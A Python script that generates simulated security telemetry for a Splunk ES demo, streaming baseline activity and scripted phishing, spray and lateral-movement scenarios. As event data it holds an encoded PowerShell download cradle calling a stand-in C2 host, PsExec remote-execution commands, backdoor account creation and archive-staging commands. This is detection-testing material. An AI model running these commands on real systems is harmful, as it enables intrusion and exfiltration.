#!/usr/bin/env python3
"""
esdemo.py - live data generator for the Kestrel Systems ES 8 demo.

Streams simulated security telemetry to Splunk Cloud HEC: a steady trickle of
normal activity (baseline) plus attack scenarios you start on demand. Every event carries an
ingest_batch field (the run id) so you can find a run later. Events carry no scenario labels,
so nothing in the data tells the AI SOC analyst which activity is the attack.

Commands
  baseline                 stream normal activity until Ctrl-C
  run <scenario> [...]     play one or more scenarios once (with baseline running alongside)
  demo                     baseline + all scenarios on the demo timeline, then keep baseline running
  status                   show the incident budget
  reset-budget             zero the local incident budget (after you have closed the demo findings)
  list                     list scenarios and the findings each one produces

Scenarios: phishing, spray, benign, lateral

Connection (same as verify.py)
  export ESDEMO_HEC_TOKEN=<token>        required
  --stack <stack>                        your Splunk Cloud stack name (or ESDEMO_STACK / --url)
  --system-trust                         use the OS certificate store (corporate TLS inspection)
  --ca-bundle <pem>                      or a specific CA bundle
  --dry-run                              print events instead of sending
  --speed 2                              play scenarios twice as fast (timeline compression)

The incident budget is tracked in ~/.esdemo_budget.json. Each scenario declares
how many findings it will create; the generator refuses to start a scenario that
would push the total over the cap (default 50, --cap to change).
"""
import argparse
import base64
import csv
import json
import os
import random
import signal
import ssl
import sys
import threading
import time
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
DOMAIN = "kestrel.example"
NT = "KESTREL"
BUDGET_FILE = os.path.expanduser("~/.esdemo_budget.json")
DEFAULT_CAP = 50

# Attacker infrastructure: documentation ranges / reserved TLD only.
PHISH_SENDER = "payroll-notice@kestrel-hr-notices.example"
PHISH_SENDER_IP = "198.51.100.23"
HARVEST_DOMAIN = "kestrel-sso-verify.example"
C2_DOMAIN = "cdn-update-check.example"
C2_IP = "203.0.113.99"
ATTACKER_LOGIN_IP = "203.0.113.45"
SPRAY_IP = "198.51.100.77"
FORWARD_TO = "finance-archive@mailbox-relay.example"

# Findings each scenario produces (event-based) - used for the budget.
SCENARIOS = {
    "phishing": dict(findings=3, desc="Phishing email to 3 finance/exec users; dchen clicks, enters credentials; "
                                      "attacker signs in as dchen from 203.0.113.45 and adds an inbox forwarding "
                                      "rule; macro document launches encoded PowerShell on kes-ws-fin-001",
                     detections=["Phishing Email from Lookalike Domain Delivered (1)",
                                 "User Browsed to Known Phishing Domain (risk only)",
                                 "Successful Sign-in from External IP Address - dchen (1)",
                                 "Encoded PowerShell Command Executed - dchen (1)",
                                 "inbox forwarding rule = detection gap for Detection Builder (+1 once built)"]),
    "spray": dict(findings=3, desc="Password spray from 198.51.100.77 against 18 accounts, then a successful "
                                   "sign-in as slee",
                  detections=["Password Spray Against Multiple Accounts (1)",
                              "Successful Sign-in After Password Spray - slee (1)",
                              "Successful Sign-in from External IP Address - slee (1)"]),
    "benign": dict(findings=2, desc="Look-alikes for the Triage agent: rkumar runs an encoded PowerShell "
                                    "inventory script; the vulnerability scanner sweeps the server subnet",
                   detections=["Encoded PowerShell Command Executed - rkumar (1, benign)",
                               "Internal Network Scan Detected - kes-vulnscan01 (1, benign)"]),
    "lateral": dict(findings=4, desc="dchen moves laterally with PsExec to kes-fs01 and kes-sql01, creates "
                                     "account svc_sqlbackup2, stages a password-protected archive on kes-sql01 "
                                     "and sends ~900 MB to 203.0.113.99",
                    detections=["Remote Execution with PsExec - dchen (1)",
                                "Account Created by Non-IT User - dchen (1)",
                                "Password-Protected Archive Created (risk only)",
                                "Large Outbound Transfer to External Destination - kes-sql01 (1)",
                                "finding-based: Multi-Stage Attack on Entity - dchen (1)"]),
}
# Demo timeline: (seconds after start, scenario)
DEMO_TIMELINE = [(0, "phishing"), (45, "spray"), (90, "benign"), (150, "lateral")]
# Allowance for the live Detection Builder detection + investigations you promote.
DEMO_EXTRA = 2


# ----------------------------------------------------------------- utilities
_LOG_LOCK = threading.Lock()


def log(msg):
    """Status lines go to stderr so --dry-run event output on stdout stays clean."""
    with _LOG_LOCK:
        print(f"[{datetime.now():%H:%M:%S}] {msg}", file=sys.stderr, flush=True)

def now_iso(ts):
    return datetime.fromtimestamp(ts, timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "+0000"


def enc_ps(script):
    return base64.b64encode(script.encode("utf-16-le")).decode()


def load_csv(name):
    for base in (os.path.join(HERE, "data"), os.path.join(HERE, "..", "TA-esdemo", "lookups"),
                 os.path.join(HERE, "TA-esdemo", "lookups")):
        p = os.path.join(base, name)
        if os.path.exists(p):
            with open(p, newline="") as f:
                return list(csv.DictReader(f))
    sys.exit(f"ERROR: cannot find {name} (expected in ./data)")


class World:
    """Users, hosts and IPs from the same lookups ES uses."""

    def __init__(self):
        self.assets = load_csv("esdemo_assets.csv")
        self.identities = load_csv("esdemo_identities.csv")
        self.host_by_owner = {}
        self.ip = {}
        for a in self.assets:
            self.ip[a["nt_host"]] = a["ip"]
            if a["category"].startswith(("workstation", "laptop")):
                self.host_by_owner.setdefault(a["owner"], a["nt_host"])
        self.people = []
        for i in self.identities:
            user = i["identity"].split("|")[0]
            if not user.startswith("svc_"):
                self.people.append(dict(user=user, email=i["email"], bunit=i["bunit"],
                                        host=self.host_by_owner.get(user)))
        self.people = [p for p in self.people if p["host"]]
        self.servers = [a["nt_host"] for a in self.assets if not a["category"].startswith(("workstation", "laptop"))]


# ----------------------------------------------------------------- HEC sender
class Sender:
    def __init__(self, url, token, ctx, dry_run=False, index=None):
        self.url, self.token, self.ctx, self.dry_run, self.index = url, token, ctx, dry_run, index
        self.lock = threading.Lock()
        self.sent = 0
        self.errors = 0

    def send(self, events):
        if not events:
            return
        if self.index:
            for e in events:
                e["index"] = self.index
        if self.dry_run:
            with self.lock:
                for e in events:
                    print(json.dumps(e))
                self.sent += len(events)
            return
        data = "\n".join(json.dumps(e) for e in events).encode()
        req = urllib.request.Request(self.url, data=data, method="POST", headers={
            "Authorization": f"Splunk {self.token}", "Content-Type": "application/json"})
        for attempt in range(3):
            try:
                with urllib.request.urlopen(req, timeout=20, context=self.ctx) as r:
                    r.read()
                with self.lock:
                    self.sent += len(events)
                return
            except urllib.error.HTTPError as e:
                body = e.read().decode(errors="replace")
                if e.code in (400, 401, 403):
                    raise SystemExit(f"HEC rejected the events: HTTP {e.code} {body}")
                err = f"HTTP {e.code}"
            except Exception as e:  # network blips: retry
                err = str(e)
            time.sleep(1 + attempt * 2)
        with self.lock:
            self.errors += 1
        print(f"  ! HEC send failed after retries: {err}", file=sys.stderr)


# Realistic source names. Nothing in an event may reveal which scenario produced it:
# the AI SOC analyst reads raw events, and a label like "benign" would give the answer away.
SOURCE_FOR = {"esdemo:auth": "kestrel:idp:signin", "esdemo:endpoint:process": "kestrel:edr:process",
              "esdemo:email": "kestrel:mailgw:message", "esdemo:proxy": "kestrel:proxy:access",
              "esdemo:firewall": "kestrel:fw01:traffic", "esdemo:change": "WinEventLog:Security",
              "esdemo:o365:audit": "o365:management:activity"}


def ev(st, host, ts, body, run, scenario):
    body = dict(body)
    body.setdefault("ingest_batch", run)
    if st != "esdemo:o365:audit":
        body = {"timestamp": now_iso(ts), **body}
    return {"time": round(ts, 3), "host": host, "source": SOURCE_FOR[st], "sourcetype": st, "event": body}


# ----------------------------------------------------------------- event builders
def auth(ts, run, sc, user, src, action, app="kestrel-sso", dest="kes-dc01", method="password+mfa",
         reason="", sig_id=None):
    return ev("esdemo:auth", "kes-idp", ts, {
        "action": action, "app": app, "user": user, "src": src, "dest": dest,
        "authentication_method": method,
        "signature": "User logged on" if action == "success" else "User failed to log on",
        "signature_id": sig_id or ("4624" if action == "success" else "4625"), "reason": reason,
    }, run, sc)


def proc(ts, run, sc, host, user, name, cmd, parent, parent_cmd, path=None, integrity="medium"):
    return ev("esdemo:endpoint:process", host, ts, {
        "dest": host, "user": user, "process_name": name, "process": cmd,
        "process_path": path or f"C:\\Windows\\System32\\{name}",
        "process_id": random.randint(1000, 30000), "process_guid": str(uuid.uuid4()),
        "parent_process_name": parent, "parent_process": parent_cmd,
        "parent_process_id": random.randint(500, 9000), "parent_process_path": parent_cmd.split(" ")[0].strip('"'),
        "original_file_name": name, "process_integrity_level": integrity,
        "process_hash": "SHA256=" + uuid.uuid5(uuid.NAMESPACE_DNS, name).hex * 2,
    }, run, sc)


def web(ts, run, sc, user, src, url, method="GET", status=200, bytes_in=None, bytes_out=None, category="Business",
        action="allowed"):
    domain = url.split("/")[2]
    return ev("esdemo:proxy", "kes-proxy", ts, {
        "action": action, "src": src, "user": user, "url": url, "url_domain": domain, "dest": domain,
        "http_method": method, "status": status, "bytes_in": bytes_in or random.randint(2000, 90000),
        "bytes_out": bytes_out or random.randint(300, 2000), "category": category,
        "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0",
        "http_content_type": "text/html",
    }, run, sc)


def flow(ts, run, sc, src, dest, port, app, bytes_out, bytes_in=None, action="allowed", direction="outbound",
         rule="allow-outbound-web"):
    return ev("esdemo:firewall", "kes-fw01", ts, {
        "action": action, "src": src, "src_port": random.randint(49152, 65000), "dest": dest, "dest_port": port,
        "transport": "tcp", "app": app, "bytes_out": bytes_out,
        "bytes_in": bytes_in if bytes_in is not None else random.randint(500, 20000),
        "direction": direction, "rule": rule,
    }, run, sc)


def mail(ts, run, sc, sender, recipient, subject, src, msg_id, action="delivered", url="", file_name="",
         signature="clean", direction="inbound"):
    return ev("esdemo:email", "kes-mailgw", ts, {
        "action": action, "src_user": sender, "recipient": recipient, "subject": subject, "message_id": msg_id,
        "src": src, "url": url, "file_name": file_name, "signature": signature, "direction": direction,
    }, run, sc)


def change(ts, run, sc, action, obj, src_user, command, sig_id, dest="kes-dc01"):
    return ev("esdemo:change", dest, ts, {
        "action": action, "change_type": "AAA", "object_category": "user", "object": obj, "user": obj,
        "src_user": src_user, "dest": dest, "command": command, "signature_id": sig_id,
        "result": "success", "status": "success",
    }, run, sc)


def o365(ts, run, sc, user, ip, operation, params, result="Succeeded"):
    return ev("esdemo:o365:audit", "office365", ts, {
        "CreationTime": datetime.fromtimestamp(ts, timezone.utc).strftime("%Y-%m-%dT%H:%M:%S"),
        "Id": str(uuid.uuid4()), "Workload": "Exchange", "RecordType": 1, "Operation": operation,
        "UserId": f"{user}@{DOMAIN}", "ClientIP": ip, "ResultStatus": result, "ObjectId": f"{user}@{DOMAIN}",
        "Parameters": [{"Name": k, "Value": v} for k, v in params],
    }, run, sc)


# ----------------------------------------------------------------- baseline
BENIGN_SITES = ["https://outlook.office.com/mail/", "https://teams.microsoft.com/", "https://www.bbc.co.uk/news",
                "https://github.com/", "https://docs.python.org/3/", "https://www.straitstimes.com/",
                "https://kestrel.example/intranet/", "https://login.microsoftonline.com/",
                "https://www.linkedin.com/feed/", "https://news.ycombinator.com/", "https://www.xero.com/"]
BENIGN_PROCS = [("chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""),
                ("outlook.exe", "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\""),
                ("ms-teams.exe", "\"C:\\Program Files\\WindowsApps\\MSTeams\\ms-teams.exe\""),
                ("excel.exe", "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" /dde"),
                ("onedrive.exe", "\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background"),
                ("notepad.exe", "notepad.exe C:\\Users\\Public\\notes.txt")]
SAAS_IPS = ["192.0.2.10", "192.0.2.25", "192.0.2.40"]
INTERNAL_SERVERS = ["kes-dc01", "kes-dc02", "kes-fs01", "kes-erp01", "kes-hr01", "kes-web01"]


def baseline_batch(world, ts, run, n):
    out = []
    for _ in range(n):
        p = random.choice(world.people)
        ip = world.ip[p["host"]]
        t = ts + random.random()
        kind = random.choices(["auth", "proc", "web", "flow", "mail", "o365", "fail", "change"],
                              weights=[18, 20, 25, 22, 8, 3, 3, 1])[0]
        if kind == "auth":
            out.append(auth(t, run, "baseline", p["user"], ip, "success",
                            app=random.choice(["kestrel-sso", "kestrel-sso", "microsoft-365", "vpn"])))
        elif kind == "fail":
            out.append(auth(t, run, "baseline", p["user"], ip, "failure", reason="bad password"))
        elif kind == "proc":
            name, cmd = random.choice(BENIGN_PROCS)
            out.append(proc(t, run, "baseline", p["host"], p["user"], name, cmd, "explorer.exe",
                            "C:\\Windows\\explorer.exe", path=cmd.split('"')[1] if '"' in cmd else None))
            if p["user"] in ("rkumar", "egarcia") and random.random() < 0.3:
                out.append(proc(t, run, "baseline", p["host"], p["user"], "powershell.exe",
                                "powershell.exe -NoProfile -Command Get-Service | Where-Object Status -eq Stopped",
                                "explorer.exe", "C:\\Windows\\explorer.exe",
                                path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"))
        elif kind == "web":
            out.append(web(t, run, "baseline", p["user"], ip, random.choice(BENIGN_SITES)))
        elif kind == "flow":
            if random.random() < 0.5:
                srv = random.choice(INTERNAL_SERVERS)
                port, app = random.choice([(445, "smb"), (443, "https"), (389, "ldap"), (88, "kerberos")])
                out.append(flow(t, run, "baseline", ip, world.ip[srv], port, app, random.randint(500, 60000),
                                direction="internal", rule="allow-internal"))
            else:
                out.append(flow(t, run, "baseline", ip, random.choice(SAAS_IPS), 443, "ssl",
                                random.randint(1000, 400000)))
        elif kind == "mail":
            q = random.choice(world.people)
            ext = random.random() < 0.4
            sender = random.choice(["orders@supplier-portal.example", "newsletter@industry-news.example",
                                    "ap@partner-logistics.example"]) if ext else q["email"]
            out.append(mail(t, run, "baseline", sender, p["email"],
                            random.choice(["Invoice INV-%d" % random.randint(1000, 9999), "Weekly sync notes",
                                           "Re: project timeline", "Lunch on Friday?", "Updated forecast"]),
                            "192.0.2.77" if ext else "10.10.0.70", f"<{uuid.uuid4()}@{DOMAIN}>",
                            direction="inbound" if ext else "internal"))
        elif kind == "o365":
            out.append(o365(t, run, "baseline", p["user"], ip, random.choice(["MailItemsAccessed", "Set-Mailbox"]),
                            [("Identity", f"{p['user']}@{DOMAIN}"), ("AutoReplyState", "Disabled")]))
        elif kind == "change":
            admin = random.choice(["rkumar", "jkim"])
            out.append(change(t, run, "baseline", "modified", p["user"], admin,
                              f"Set-ADUser {p['user']} -Replace @{{telephoneNumber='+65 6{random.randint(1000000, 9999999)}'}}",
                              "4738"))
    return out


# ----------------------------------------------------------------- scenarios
# Each returns a list of (offset_seconds, [events]) built relative to t0.
def sc_phishing(world, t0, run, s):
    sc = "phishing"
    msg = f"<{uuid.uuid4().hex[:16]}@kestrel-hr-notices.example>"
    link = f"https://{HARVEST_DOMAIN}/login?session={uuid.uuid4().hex[:12]}&u=dchen"
    subj = "Action required: Q4 payroll adjustment - confirm by 5pm"
    ws = "kes-ws-fin-001"
    wip = world.ip[ws]
    payload = enc_ps(f"IEX (New-Object Net.WebClient).DownloadString('https://{C2_DOMAIN}/update.ps1')")
    steps = []
    steps.append((0, [mail(t0 + i, run, sc, PHISH_SENDER, f"{u}@{DOMAIN}", subj, PHISH_SENDER_IP, msg, url=link,
                           file_name="Payroll_Adjustment_Q4.docm") for i, u in enumerate(["dchen", "mwong", "pnair"])]))
    steps.append((20 / s, [web(t0 + 20 / s, run, sc, "dchen", wip, link, category="Uncategorized"),
                           web(t0 + 28 / s, run, sc, "dchen", wip, f"https://{HARVEST_DOMAIN}/login/submit",
                               method="POST", bytes_out=1840, category="Uncategorized")]))
    steps.append((35 / s, [proc(t0 + 35 / s, run, sc, ws, "dchen", "winword.exe",
                                "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n "
                                "\"C:\\Users\\dchen\\Downloads\\Payroll_Adjustment_Q4.docm\"",
                                "outlook.exe", "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
                                path="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE")]))
    steps.append((42 / s, [proc(t0 + 42 / s, run, sc, ws, "dchen", "powershell.exe",
                                f"powershell.exe -nop -w hidden -enc {payload}", "winword.exe",
                                "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"",
                                path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
                           web(t0 + 44 / s, run, sc, "dchen", wip, f"https://{C2_DOMAIN}/update.ps1",
                               category="Uncategorized", bytes_in=48211),
                           flow(t0 + 46 / s, run, sc, wip, C2_IP, 443, "ssl", 4210)]))
    steps.append((60 / s, [auth(t0 + 60 / s, run, sc, "dchen", ATTACKER_LOGIN_IP, "success", app="microsoft-365",
                                dest="outlook.office.com", method="password+mfa_push")]))
    steps.append((75 / s, [o365(t0 + 75 / s, run, sc, "dchen", ATTACKER_LOGIN_IP, "New-InboxRule",
                                [("Name", "."), ("From", "payroll@kestrel.example"), ("ForwardTo", FORWARD_TO),
                                 ("MarkAsRead", "True"), ("StopProcessingRules", "True")])]))
    return steps


def sc_spray(world, t0, run, s):
    sc = "spray"
    targets = ["agrant", "lmorales", "mbrown", "ajones", "ksingh", "nwilliams", "cwhite", "vpatel", "ytan",
               "fmuller", "iahmed", "zli", "tnguyen", "eobrien", "bfischer", "hsato", "tokafor", "slee"]
    steps = []
    for i, u in enumerate(targets):
        steps.append(((i * 3) / s, [auth(t0 + (i * 3) / s, run, sc, u, SPRAY_IP, "failure",
                                         app="kestrel-sso", reason="bad password")]))
    steps.append(((len(targets) * 3 + 8) / s, [auth(t0 + (len(targets) * 3 + 8) / s, run, sc, "slee", SPRAY_IP,
                                                    "success", app="kestrel-sso", method="password")]))
    return steps


def sc_benign(world, t0, run, s):
    sc = "benign"
    script = ("Get-ADComputer -Filter * -Properties OperatingSystem,LastLogonDate | "
              "Select Name,OperatingSystem,LastLogonDate | Export-Csv \\\\kes-fs01\\it$\\inventory\\weekly.csv")
    steps = [(0, [proc(t0, run, sc, "kes-ws-it-001", "rkumar", "powershell.exe",
                       f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {enc_ps(script)}",
                       "powershell_ise.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe",
                       path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", integrity="high")])]
    scanner = world.ip["kes-vulnscan01"]
    targets = [a["ip"] for a in world.assets if a["ip"] != scanner][:26]
    ports = [22, 80, 135, 139, 443, 445, 1433, 3389, 5985, 8080]
    batch = []
    for i, ip in enumerate(targets):
        for p in ports:
            batch.append(flow(t0 + 10 / s + i * 0.5 / s, run, sc, scanner, ip, p, "tcp-scan", 120, bytes_in=60,
                              action=random.choice(["allowed", "allowed", "blocked"]), direction="internal",
                              rule="allow-vulnscan"))
    steps.append((10 / s, batch))
    return steps


def sc_lateral(world, t0, run, s):
    sc = "lateral"
    ws, wip = "kes-ws-fin-001", world.ip["kes-ws-fin-001"]
    sql, sip = "kes-sql01", world.ip["kes-sql01"]
    steps = []
    steps.append((0, [proc(t0, run, sc, ws, "dchen", "net.exe", "net group \"Domain Admins\" /domain", "cmd.exe",
                           "C:\\Windows\\System32\\cmd.exe"),
                      proc(t0 + 4 / s, run, sc, ws, "dchen", "nltest.exe", "nltest /dclist:kestrel", "cmd.exe",
                           "C:\\Windows\\System32\\cmd.exe")]))
    ev20 = []
    for i, tgt in enumerate(["kes-fs01", "kes-sql01"]):
        t = t0 + (20 + i * 8) / s
        ev20 += [proc(t, run, sc, ws, "dchen", "PsExec64.exe",
                      f"PsExec64.exe \\\\{tgt} -accepteula -s cmd.exe /c \"whoami & hostname\"", "cmd.exe",
                      "C:\\Windows\\System32\\cmd.exe", path="C:\\Users\\dchen\\AppData\\Local\\Temp\\PsExec64.exe"),
                 flow(t + 1, run, sc, wip, world.ip[tgt], 445, "smb", 18000, direction="internal",
                      rule="allow-internal"),
                 proc(t + 2, run, sc, tgt, "SYSTEM", "PSEXESVC.exe", "C:\\Windows\\PSEXESVC.exe", "services.exe",
                      "C:\\Windows\\System32\\services.exe", path="C:\\Windows\\PSEXESVC.exe", integrity="system")]
    steps.append((20 / s, ev20))
    steps.append((50 / s, [change(t0 + 50 / s, run, sc, "created", "svc_sqlbackup2", "dchen",
                                  "New-ADUser -Name svc_sqlbackup2 -Enabled $true -PasswordNeverExpires $true", "4720"),
                           change(t0 + 53 / s, run, sc, "modified", "svc_sqlbackup2", "dchen",
                                  "Add-ADGroupMember -Identity 'SQL Admins' -Members svc_sqlbackup2", "4728")]))
    steps.append((80 / s, [proc(t0 + 80 / s, run, sc, sql, "dchen", "7z.exe",
                                "7z.exe a -tzip -pK3str3l!2026 -mhe=on C:\\ProgramData\\fin_q4.zip D:\\Finance\\*",
                                "cmd.exe", "C:\\Windows\\System32\\cmd.exe", path="C:\\ProgramData\\7z.exe")]))
    chunks = []
    for i in range(6):
        chunks.append(flow(t0 + (110 + i * 6) / s, run, sc, sip, C2_IP, 443, "ssl",
                           random.randint(140, 170) * 1048576, bytes_in=random.randint(4000, 9000)))
    steps.append((110 / s, chunks))
    return steps


BUILDERS = {"phishing": sc_phishing, "spray": sc_spray, "benign": sc_benign, "lateral": sc_lateral}


# ----------------------------------------------------------------- budget
def load_budget():
    try:
        with open(BUDGET_FILE) as f:
            return json.load(f)
    except (OSError, ValueError):
        return {"used": 0, "history": []}


def save_budget(b):
    with open(BUDGET_FILE, "w") as f:
        json.dump(b, f, indent=2)


def reserve(names, cap, extra=0, force=False):
    b = load_budget()
    need = sum(SCENARIOS[n]["findings"] for n in names) + extra
    if b["used"] + need > cap and not force:
        raise SystemExit(f"Incident budget: {b['used']} used + {need} needed > cap {cap}. Close the demo findings "
                         f"in ES, then run 'esdemo.py reset-budget' (or pass --force).")
    b["used"] += need
    b["history"].append({"time": datetime.now().isoformat(timespec="seconds"), "scenarios": names, "findings": need})
    save_budget(b)
    log(f"Incident budget: reserved {need}, now {b['used']}/{cap}")


# ----------------------------------------------------------------- runners
class Baseline(threading.Thread):
    def __init__(self, world, sender, run, eps):
        super().__init__(daemon=True)
        self.world, self.sender, self.run_id, self.eps = world, sender, run, eps
        self.stop_evt = threading.Event()

    def run(self):
        while not self.stop_evt.is_set():
            t = time.time()
            n = max(1, int(self.eps * 5))
            self.sender.send(baseline_batch(self.world, t, self.run_id, n))
            self.stop_evt.wait(5)

    def stop(self):
        self.stop_evt.set()


def play(world, sender, run, name, speed, t_start=None):
    t0 = t_start or time.time()
    steps = BUILDERS[name](world, t0, run, speed)
    log(f">>> scenario '{name}' started")
    for offset, events in sorted(steps, key=lambda x: x[0]):
        wait = t0 + offset - time.time()
        if wait > 0:
            time.sleep(wait)
        # do not send events stamped in the future
        for e in events:
            e["time"] = min(e["time"], time.time())
        sender.send(events)
    log(f"<<< scenario '{name}' done")


def build_sender(a):
    if a.dry_run:
        return Sender(None, None, None, dry_run=True, index=a.index)
    if not a.token:
        raise SystemExit("ERROR: set ESDEMO_HEC_TOKEN or pass --token")
    if not (a.url or a.stack):
        raise SystemExit("ERROR: set ESDEMO_STACK (or --stack <stack> / --url <HEC base URL>)")
    base = (a.url or f"https://http-inputs-{a.stack}.splunkcloud.com").rstrip("/")
    url = base if base.endswith("/services/collector/event") else base + "/services/collector/event"
    if a.system_trust:
        try:
            import truststore
        except ImportError:
            raise SystemExit("ERROR: --system-trust needs: python3 -m pip install truststore")
        ctx = truststore.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    elif a.ca_bundle:
        ctx = ssl.create_default_context(cafile=a.ca_bundle)
    elif url.startswith("http://"):
        ctx = None
    else:
        ctx = ssl.create_default_context()
    return Sender(url, a.token, ctx, index=a.index)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("command", choices=["baseline", "run", "demo", "status", "reset-budget", "list"])
    ap.add_argument("scenarios", nargs="*")
    ap.add_argument("--stack", default=os.environ.get("ESDEMO_STACK"))
    ap.add_argument("--url", default=os.environ.get("ESDEMO_HEC_URL"))
    ap.add_argument("--token", default=os.environ.get("ESDEMO_HEC_TOKEN"))
    ap.add_argument("--index", default=None)
    ap.add_argument("--system-trust", action="store_true", default=os.environ.get("ESDEMO_SYSTEM_TRUST") == "1")
    ap.add_argument("--ca-bundle", default=os.environ.get("ESDEMO_CA_BUNDLE"))
    ap.add_argument("--eps", type=float, default=2.0, help="baseline events per second (default 2)")
    ap.add_argument("--speed", type=float, default=1.0, help="scenario timeline speed-up (default 1)")
    ap.add_argument("--cap", type=int, default=DEFAULT_CAP)
    ap.add_argument("--force", action="store_true", help="ignore the incident budget")
    ap.add_argument("--no-baseline", action="store_true", help="run scenarios without baseline noise")
    ap.add_argument("--exit-after", type=int, default=0,
                    help="demo/baseline: stop after N seconds (default: run until Ctrl-C)")
    ap.add_argument("--dry-run", action="store_true")
    a = ap.parse_args()

    if a.command == "list":
        for n, s in SCENARIOS.items():
            print(f"{n:9} {s['findings']} findings  {s['desc']}")
            for d in s["detections"]:
                print(f"            - {d}")
        print(f"\ndemo timeline: " + ", ".join(f"+{o}s {n}" for o, n in DEMO_TIMELINE))
        return
    if a.command == "status":
        b = load_budget()
        print(f"Incident budget: {b['used']}/{a.cap} used ({BUDGET_FILE})")
        for h in b["history"][-10:]:
            print(f"  {h['time']}  {'+'.join(h['scenarios']) or 'manual'}  {h['findings']}")
        print("\nActual count in ES (run on the ES search head):\n"
              "  `notable` | search source=\"Kestrel - *\" | stats count by source")
        return
    if a.command == "reset-budget":
        save_budget({"used": 0, "history": []})
        print("Incident budget reset to 0. Make sure the previous demo findings are closed in ES.")
        return

    world = World()
    run = "run-" + datetime.now().strftime("%Y%m%d-%H%M%S")
    sender = build_sender(a)
    stop = threading.Event()
    signal.signal(signal.SIGINT, lambda *_: stop.set())
    log(f"Run id: {run}   target: {'stdout (dry run)' if a.dry_run else sender.url}")

    if a.command == "run":
        bad = [s for s in a.scenarios if s not in SCENARIOS]
        if not a.scenarios or bad:
            raise SystemExit(f"Choose scenarios from: {', '.join(SCENARIOS)}")
        if not a.dry_run:
            reserve(a.scenarios, a.cap, force=a.force)
    elif a.command == "demo" and not a.dry_run:
        reserve([n for _, n in DEMO_TIMELINE], a.cap, extra=DEMO_EXTRA, force=a.force)

    bl = None
    if a.command in ("baseline", "demo") or (a.command == "run" and not a.no_baseline):
        bl = Baseline(world, sender, run, a.eps)
        bl.start()
        log(f"Baseline streaming at ~{a.eps:g} events/s")

    t_start = time.time()
    if a.command == "run":
        for n in a.scenarios:
            if stop.is_set():
                break
            play(world, sender, run, n, a.speed)
    elif a.command == "demo":
        threads = []
        for offset, n in DEMO_TIMELINE:
            th = threading.Thread(target=lambda o=offset, n=n: (time.sleep(o / a.speed), None if stop.is_set()
                                                                  else play(world, sender, run, n, a.speed)),
                                  daemon=True)
            th.start()
            threads.append(th)
        for th in threads:
            while th.is_alive() and not stop.is_set():
                th.join(0.5)
        if not stop.is_set():
            log("All scenarios sent. Baseline keeps running - Ctrl-C to stop.")

    if a.command in ("baseline", "demo"):
        while not stop.is_set():
            if a.exit_after and time.time() - t_start >= a.exit_after:
                break
            stop.wait(1)
    if bl:
        bl.stop()
        bl.join(6)
    log(f"Sent {sender.sent} events ({sender.errors} failed batches). Run id: {run}")


if __name__ == "__main__":
    main()
